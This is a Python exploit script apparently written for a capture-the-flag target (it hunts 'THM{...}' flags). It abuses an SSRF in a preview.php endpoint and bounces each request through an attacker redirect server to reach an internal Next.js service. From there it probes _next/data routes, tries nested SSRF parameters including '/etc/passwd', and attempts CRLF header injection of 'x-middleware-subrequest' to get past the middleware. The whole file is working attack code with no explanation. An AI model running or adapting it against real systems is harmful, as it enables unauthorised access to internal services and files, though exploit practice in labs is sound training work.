import requests, urllib.parse, re

attacker = 'http://192.168.223.117:8000'
base = 'http://10.82.159.192/preview.php?url='
BUILD_ID = 'k9Pjo5x24QkUE90SdyHNw'

def fetch(path):
    target = 'http://127.0.0.1:10000' + path
    redir = attacker + '/redirect?to=' + urllib.parse.quote(target, safe='')
    r = requests.get(base + urllib.parse.quote(redir, safe=''), timeout=10)
    return r.text, len(r.text)

# 1. Next.js RSC data routes (JSON) - sometimes bypass middleware
print('=== _next/data routes ===')
for path in [
    f'/_next/data/{BUILD_ID}/index.json',
    f'/_next/data/{BUILD_ID}/customapi.json',
    f'/_next/data/{BUILD_ID}/admin.json',
    f'/_next/data/{BUILD_ID}/flag.json',
]:
    body, size = fetch(path)
    is404 = 'could not be found' in body or size > 7000
    print(f'[{"404" if is404 else str(size)+"b"}] {path}')
    if not is404 and size < 7000:
        print(body[:300])

# 2. customapi with URL params (SSRF-in-SSRF)
print('\n=== /customapi?url= params ===')
for q in ['?url=http://127.0.0.1/', '?target=http://127.0.0.1/',
          '?fetch=http://127.0.0.1/', '?endpoint=http://127.0.0.1/',
          '?q=http://127.0.0.1/', '?path=/etc/passwd']:
    body, size = fetch('/customapi' + q)
    is_same = size in [6131, 7356, 7357, 7358, 7359, 7360, 7361, 7362, 7363]
    print(f'[{"SAME" if is_same else str(size)+"b HIT"}] /customapi{q}')
    if not is_same:
        print(body[:200])

# 3. CRLF injection attempt to add x-middleware-subrequest header
print('\n=== CRLF header injection ===')
crlf_path = '/customapi\r\nx-middleware-subrequest: middleware'
body, size = fetch(urllib.parse.quote(crlf_path))
print(f'[{size}b] CRLF attempt')
flags = re.findall(r'THM\{[^}]+\}', body)
if flags:
    print('FLAGS:', flags)
